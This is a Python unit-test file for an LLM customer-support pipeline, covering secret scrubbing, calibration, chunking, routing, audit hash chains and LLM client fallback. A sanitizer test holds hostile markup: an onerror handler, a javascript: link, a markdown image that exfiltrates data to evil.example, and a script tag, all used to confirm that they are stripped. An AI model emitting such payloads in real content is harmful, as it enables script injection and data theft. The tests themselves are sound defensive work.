"""Unit tests for the building blocks (scrubber, calibration maths, chunking, routing modes, hash chain, LLM client, CLIs)."""
import json
import sqlite3
from types import SimpleNamespace

import groq
import httpx
import numpy as np
import pytest

from evaluation.calibrate import apply_platt, denoise_labels, ece, fit_platt, grid_search, main as calibrate_main, strata
from evaluation.harness import main as harness_main
from evaluation.metrics_calculator import compute_metrics, render_markdown
from src.classify import canon_intent, platt
from src.config import IDK, PlattScaling, Settings, get_settings
from src.generate import sanitize_draft_markdown
from src.guardrails import SCRUBBER, _support, claim_sentences
from src.ingest import customer_id_hash
from src.llm import LLMClient, LLMUnavailableError, _Provider, extract_json
from src.retrieve import _ntok, _windows, chunk_article, evidence_units
from src.route import priority, queue_order
from tests.helpers import FakeNLI, chat_response, respond, ticket


def test_scrubber_redacts_every_secret_family():
    text = ("-----BEGIN RSA PRIVATE KEY-----\nMIIEow\n-----END RSA PRIVATE KEY----- Authorization: Bearer abc.def-123 "
            "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY card 4111 1111 1111 1111 call +1 415 555 0134")
    clean, counts = SCRUBBER.scrub(text)
    assert {"PEM_PRIVATE_KEY", "BEARER_TOKEN", "AWS_SECRET_KEY", "CREDIT_CARD", "PHONE_NUMBER"} <= set(counts)
    assert not any(s in clean for s in ("MIIEow", "abc.def-123", "wJalrXUtnFEMI", "4111 1111", "555 0134"))


def test_customer_id_hash_is_keyed_hmac():
    same = customer_id_hash("alice@example.com", "salt-a")
    assert len(same) == 64 and same == customer_id_hash("alice@example.com", "salt-a")
    assert same != customer_id_hash("alice@example.com", "salt-b")


def test_draft_markup_is_stripped_before_release():
    body = ('Step 1. Run the command. <img src=x onerror=alert(1)> [click](javascript:alert(1)) '
            '![x](https://evil.example/?d=secret) <script>steal()</script> Use List<String>.')
    clean = sanitize_draft_markdown(body)
    assert "onerror" not in clean and "javascript:" not in clean and "evil.example" not in clean and "steal" not in clean
    assert "<img" not in clean and "click" in clean and "List<String>" in clean


def test_production_settings_require_api_key_and_salt():
    with pytest.raises(ValueError):
        Settings(_env_file=None, app_env="production", api_key="", customer_id_salt="")
    with pytest.raises(ValueError):
        Settings(_env_file=None, customer_id_salt="change_me_to_a_long_random_string")
    s = Settings(_env_file=None, app_env="production", api_key="k" * 16, customer_id_salt="s" * 16)
    assert s.app_env == "production" and s.api_key.get_secret_value() == "k" * 16


def test_claim_sentences_skip_courtesy_and_questions():
    body = "Thanks for reaching out.\n1. Run cloudserve auth logout to discard the cached token.\nDoes that help?\nLet us know if it persists."
    assert claim_sentences(body) == ["Run cloudserve auth logout to discard the cached token."]


def test_intent_canonicalisation_and_platt_are_safe():
    assert canon_intent("Deployment Failure") == "deployment_failure" and canon_intent("I don't know") == IDK and canon_intent("banana") is None
    ps = PlattScaling(temperature_T=1.0, slope_a=1.0, intercept_b=0.0)
    assert platt(0.0, ps) < platt(0.5, ps) < platt(1.0, ps) and abs(platt(0.7, ps) - 0.7) < 1e-9


def test_chunks_keep_parent_anchor_and_code_fences():
    long = "# T\n\n## Steps\n\n" + "\n\n".join(f"Paragraph {i} " + "word " * 60 for i in range(12)) + "\n\n```bash\ncloudserve deploy --wait\n\ncloudserve logs\n```"
    chunks = chunk_article({"doc_id": "DOC-X-001", "title": "T", "content": long})
    assert len(chunks) == 2 and all(_ntok(c["text"]) <= 512 for c in chunks)
    assert chunks[1]["text"].split()[:5] == chunks[0]["text"].split()[-64:][:5]  # 64-word overlap carried into the next window
    assert all(c["chunk_text"].startswith("[Doc ID: DOC-X-001 | Article: T | Section: ") for c in chunks)
    assert any("cloudserve deploy --wait\n\ncloudserve logs" in c["text"] for c in chunks)
    assert len(_windows("short text")) == 1


def test_nli_evidence_is_sentence_level_and_missing_evidence_is_unsupported(docs):
    units = evidence_units(next(d for d in docs if d["doc_id"] == "DOC-DEPLOY-003"))
    assert "Clear the build cache from the settings page and trigger a fresh build to rule out a corrupted artefact." in units
    assert "Common causes: An unpinned dependency released a new incompatible version" in units
    assert "Build failures caused by dependency resolution applies to Build Service." in units
    assert max(len(u.split()) for u in units) < 80  # short premises only (the NLI model degrades on whole sections)
    ent, con = _support(["Run cloudserve deploy now please."], [], FakeNLI())
    assert ent.tolist() == [0.0] and con.tolist() == [1.0]


def test_priority_table_and_queue_order():
    assert [priority(t, u) for t, u in [("enterprise", "high"), ("enterprise", "low"), ("business", "high"), ("standard", "medium"), ("standard", "low")]] == \
           [("critical", 95), ("high", 85), ("high", 85), ("medium", 50), ("low", 25)]
    assert queue_order([(25, "2026-01-01"), (95, "2026-01-02"), (95, "2026-01-01")]) == [3, 2, 1]


def test_passthrough_mode_never_calls_a_model(make_pipeline, llm, run):
    st = run(make_pipeline(mode="PASSTHROUGH_QUEUE").process(ticket("Every deployment fails at the health check stage.", tier="enterprise")))
    assert st.routing_action == "ESCALATE_LOW_CONFIDENCE" and llm.calls == 0 and "PASSTHROUGH_QUEUE" in st.routing_reason_manager_text
    assert (st.priority_level, st.priority_score) == ("high", 85) and st.decision_id


def test_assist_mode_turns_auto_reply_into_tier1_draft(make_pipeline, run):
    st = run(make_pipeline(mode="ASSIST_AND_ESCALATE_ONLY").process(ticket("Every deployment fails at the health check stage.")))
    assert st.routing_action == "TIER1_DRAFT_ASSIST" and st.guardrail_passed and st.target_queue == "TIER_1_HUMAN"


def test_quarantined_article_is_never_retrieved(make_pipeline, kb, run):
    kb.excluded = {"DOC-DEPLOY-001"}
    st = run(make_pipeline().process(ticket("Every deployment fails at the health check stage.")))
    assert all(p["doc_id"] != "DOC-DEPLOY-001" for p in st.retrieved_passages + st.attempted_sources)
    assert st.routing_action == "ESCALATE_NO_GROUNDED_DOC"


def test_llm_outage_escalates_instead_of_crashing(make_pipeline, llm, run):
    llm.down = True
    st = run(make_pipeline().process(ticket("Every deployment fails at the health check stage.")))
    assert st.routing_action == "ESCALATE_LOW_CONFIDENCE" and st.predicted_intent == "unclassified_fallback" and st.decision_id


def test_hash_chain_detects_tampering(make_pipeline, store, db_path, run):
    pipe = make_pipeline()
    for i in range(3):
        run(pipe.process(ticket("Every deployment fails at the health check stage.", tid=f"C-{i}")))
    assert run(store.verify_chain()) is True
    with sqlite3.connect(db_path) as con:  # an attacker with DBA rights drops the trigger and edits history
        con.execute("DROP TRIGGER trg_immutable_decision_audit_log_update")
        con.execute("UPDATE decision_audit_log SET routing_reason = 'edited' WHERE chain_seq = 2")
    assert run(store.verify_chain()) is False


def test_hash_chain_stays_valid_when_a_node_fails(make_pipeline, kb, store, run, monkeypatch):
    def broken_search(*a, **k):
        raise RuntimeError("index unavailable: collection 'x' not found\nstack detail")
    monkeypatch.setattr(kb, "search", broken_search)
    pipe = make_pipeline()
    states = [run(pipe.process(ticket("Every deployment fails at the health check stage.", tid=f"E-{i}"))) for i in range(2)]
    assert all(s.routing_action == "ESCALATE_LOW_CONFIDENCE" and s.failed_node == "retrieve" and s.decision_id for s in states)
    assert run(store.verify_chain()) is True


def test_extract_json_handles_fences_and_prose():
    assert extract_json('Sure!\n```json\n{"a": 1}\n```') == {"a": 1}
    with pytest.raises(ValueError):
        extract_json("no json here")


def test_llm_client_cache_and_json_mode_fallback(tmp_path, run):
    calls = []

    async def create(**kw):
        calls.append(kw)
        if "response_format" in kw:
            raise groq.BadRequestError("json_validate_failed", response=httpx.Response(400, request=httpx.Request("POST", "https://x")), body=None)
        return chat_response(json.dumps(respond(kw["messages"])))

    client = LLMClient(get_settings().model_copy(update={"groq_api_key": "", "openrouter_api_key": "", "llm_cache_path": tmp_path / "c.sqlite"}))
    client.providers = [_Provider("groq", SimpleNamespace(chat=SimpleNamespace(completions=SimpleNamespace(create=create))), "m")]
    msgs = [{"role": "system", "content": "Semantic Search Assistant"}, {"role": "user", "content": "<untrusted_customer_ticket>page size</untrusted_customer_ticket>"}]
    a = run(client.complete_json(msgs, temperature=0, max_tokens=10))
    b = run(client.complete_json(msgs, temperature=0, max_tokens=10))
    assert a.data == b.data and not a.cached and b.cached and len(calls) == 2 and client.cache_hits == 1


@pytest.mark.parametrize("status, exc", [(401, groq.AuthenticationError), (402, groq.APIStatusError), (404, groq.NotFoundError)])
def test_bad_key_no_credits_or_retired_model_disables_provider_without_backoff(run, status, exc):
    req = httpx.Request("POST", "https://api.groq.com")

    async def dead(**kw):
        raise exc("provider refused", response=httpx.Response(status, request=req), body=None)

    async def alive(**kw):
        return chat_response(json.dumps(respond(kw["messages"])))

    wrap = lambda fn: SimpleNamespace(chat=SimpleNamespace(completions=SimpleNamespace(create=fn)))
    client = LLMClient(get_settings().model_copy(update={"groq_api_key": "", "openrouter_api_key": "", "llm_cache_enabled": False}))
    msgs = [{"role": "system", "content": "Semantic Search Assistant"}, {"role": "user", "content": "<untrusted_customer_ticket>page size</untrusted_customer_ticket>"}]
    client.providers = [_Provider("groq", wrap(dead), "m"), _Provider("openrouter", wrap(alive), "m")]
    assert run(client.complete_json(msgs, temperature=0, max_tokens=10)).provider == "openrouter" and client.providers[0].open_until == float("inf")
    client.providers = [_Provider("groq", wrap(dead), "m")]
    with pytest.raises(LLMUnavailableError):
        run(client.complete_json(msgs, temperature=0, max_tokens=10))
    assert client.backoff_seconds == 0.0  # permanent errors never wait


def test_llm_client_without_providers_raises(run):
    client = LLMClient(get_settings().model_copy(update={"groq_api_key": "", "openrouter_api_key": "", "llm_cache_enabled": False}))
    with pytest.raises(LLMUnavailableError):
        run(client.complete_json([{"role": "user", "content": "x"}], temperature=0, max_tokens=5))


def test_platt_fit_reaches_low_ece_and_strata_merge_rare_groups():
    rng = np.random.default_rng(1)
    z = rng.normal(0, 2, 5000)
    y = (rng.random(5000) < 1 / (1 + np.exp(-(0.8 * z + 0.3)))).astype(int)
    assert ece(apply_platt(z[4000:], fit_platt(z[:4000], y[:4000])), y[4000:])[0] < 0.05
    assert strata(["a"] * 6 + ["b"] * 2, ["fluent"] * 6 + ["non_fluent"] * 2) == ["a|fluent"] * 6 + ["rare"] * 2


def test_grid_search_prefers_feasible_high_fcr_point():
    base = {"mandatory": False, "fallback": False, "title_ok": True, "gen": "passed", "expected_auto": True, "answerable": True, "must_not": False,
            "expected_docs": ["D1"], "cited": ["D1"], "draft": "ok", "top1_doc": "D1",
            "raw_labels": {"expected_route": "auto_respond", "answerable_from_docs": True, "must_not_auto_respond": False, "expected_doc_ids": ["D1"]}}
    R = [base | {"ticket_id": f"t{i}", "pred_intent": "x", "label_intent": "x", "cite_score": 0.9, "top": 0.9, "fluency": "fluent" if i % 2 else "non_fluent"}
         for i in range(40)] + [base | {"ticket_id": f"w{i}", "pred_intent": "x", "label_intent": "y", "cite_score": 0.9, "top": 0.9, "fluency": "fluent",
                                        "expected_auto": False} for i in range(10)]
    cal = np.array([0.9] * 40 + [0.6] * 10)
    g = grid_search(R, cal, {}, ece_value=0.01)
    assert g["hard_ok"] and g["precision"] == 1.0 and 0.60 < g["tau_class"] <= 0.90 and g["n_auto"] == 40


def test_unattainable_bound_is_relaxed_to_best_plus_tolerance_and_fcr_is_maximised():
    base = {"mandatory": False, "fallback": False, "title_ok": True, "gen": "passed", "must_not": False, "cited": ["D1"], "draft": "ok", "top1_doc": "D1",
            "pred_intent": "x", "label_intent": "x", "cite_score": 0.9, "top": 0.9}
    good = {"expected_auto": True, "answerable": True, "expected_docs": ["D1"]}
    noisy = {"expected_auto": False, "answerable": False, "expected_docs": []}  # label noise: same content, labelled "escalate"
    R = [base | (noisy if i % 5 == 0 else good) | {"ticket_id": f"t{i}", "fluency": "fluent" if i % 2 else "non_fluent"} for i in range(50)]
    for r in R:
        r["raw_labels"] = {"expected_route": "auto_respond" if r["expected_auto"] else "escalate", "answerable_from_docs": r["answerable"],
                           "must_not_auto_respond": False, "expected_doc_ids": r["expected_docs"]}
    g = grid_search(R, np.full(50, 0.97), {}, ece_value=0.01)
    assert g["relaxed"] == {"max_hallucination_rate": 0.22} and g["relaxed_ok"] and not g["hard_ok"]
    assert g["fcr"] == 1.0 and g["n_auto"] == 50 and (g["tau_class"], g["tau_ret"]) == (0.95, 0.9)


def test_label_denoising_uses_majority_per_identical_text_and_conservative_ties():
    lab = lambda route, ans, docs: {"intent": "x", "expected_route": route, "answerable_from_docs": ans, "must_not_auto_respond": False, "expected_doc_ids": docs}
    tk = lambda tid, body, lb: {"ticket_id": tid, "subject": "", "body": body, "labels": lb}
    tickets = [tk("a1", "Same text", lab("auto_respond", True, ["D1"])), tk("a2", " same TEXT ", lab("auto_respond", True, ["D1"])),
               tk("a3", "Same text", lab("escalate", False, [])), tk("b1", "Tie text", lab("auto_respond", True, ["D2"])), tk("b2", "Tie text", lab("escalate", False, []))]
    out, noise = denoise_labels(tickets)
    assert out["a3"]["expected_route"] == "auto_respond" and out["a3"]["answerable_from_docs"] is True and out["a3"]["expected_doc_ids"] == ["D1"]
    assert out["b1"]["expected_route"] == "escalate" and out["b1"]["answerable_from_docs"] is False and out["b1"]["expected_doc_ids"] == ["D2"]
    assert noise == {"distinct_texts": 2, "tickets_relabelled": {"expected_route": 2, "answerable_from_docs": 2}}


def test_metrics_calculator_invariants_and_markdown():
    rec = lambda i, action, passed, lab: {"routing_action": action, "guardrail_passed": passed, "latency_ms": 100 * (i + 1), "predicted_intent": "x",
                                          "language_fluency": "fluent" if i % 2 else "non_fluent", "retrieval_executed": True, "retrieved_doc_ids": ["D1"],
                                          "validation_receipt": {"failed_checks": ["nli_hallucination_entailment_block"] if action.startswith("BLOCK") else []},
                                          "pii_redaction_counts": {"EMAIL_ADDRESS": 1} if i == 0 else {}, "labels": lab}
    lab = {"intent": "x", "expected_route": "auto_respond", "answerable_from_docs": True, "expected_doc_ids": ["D1"], "must_not_auto_respond": False}
    records = [rec(0, "AUTO_REPLY", True, lab), rec(1, "BLOCK_SAFETY_GUARDRAIL_FAIL", False, lab), rec(2, "ESCALATE_MANDATORY_INTENT", False, None)]
    m = compute_metrics(records, decisions_logged=3, wall={"start_utc": "s", "end_utc": "e", "total_seconds": 1.0})
    assert m["invariants"] == {"processed_equals_answered_plus_escalated": True, "full_audit_coverage": True}
    assert (m["volume"]["answered_automatically"], m["volume"]["escalated"], m["volume"]["blocked_by_guardrails"]) == (1, 2, 1)
    assert m["governance"]["guardrail_activations_by_type"]["nli_hallucination_entailment_block"] == 1 and m["technical"]["retrieval_hit_rate"] == 1.0
    assert "## Governance" in render_markdown(m) and m["business"]["first_contact_resolution_rate"] == round(1 / 3, 4)


def test_harness_and_calibrator_fail_fast_on_bad_inputs(tmp_path):
    assert harness_main(["--input", str(tmp_path / "missing.json"), "--output", str(tmp_path / "o")]) == 2
    (tmp_path / "t.json").write_text("[]", encoding="utf-8")
    assert harness_main(["--input", str(tmp_path / "t.json"), "--output", str(tmp_path / "o"), "--thresholds-config", str(tmp_path / "none.json")]) == 2
    forbidden = tmp_path / "validation_tickets.json"
    forbidden.write_text("[]", encoding="utf-8")
    assert calibrate_main(["--dev-tickets", str(forbidden), "--kb-docs", "data/documentation.json", "--ground-truth", "data/ground_truth_responses.json",
                           "--output-config", str(tmp_path / "a.json"), "--output-report", str(tmp_path / "r.md")]) == 2
